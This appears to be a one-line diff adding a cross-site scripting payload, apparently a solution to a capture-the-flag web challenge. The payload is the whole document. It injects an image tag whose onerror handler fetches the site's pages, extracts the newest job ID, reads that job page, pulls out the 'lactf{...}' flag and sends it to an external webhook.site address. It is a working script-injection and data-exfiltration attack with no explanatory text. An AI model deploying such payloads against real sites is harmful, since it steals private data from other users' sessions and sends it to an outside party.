@@ -1,0 +1,1 @@
+'<x><img src=x onerror='fetch(`/`).then(r=>r.text()).then(t=>{const ids=[...t.matchAll(/\/job\/([0-9a-f-]{36})/g)].map(m=>m[1]);const id=ids[ids.length-1];return fetch(`/job/${id}`)}).then(r=>r.text()).then(t=>{const flag=t.match(/lactf\{[^}]+\}/)[0];(new Image()).src=`https://webhook.site/501dc034-8bbd-488b-a02a-82b31d18ae3f?f=${encodeURIComponent(flag)}`})'>
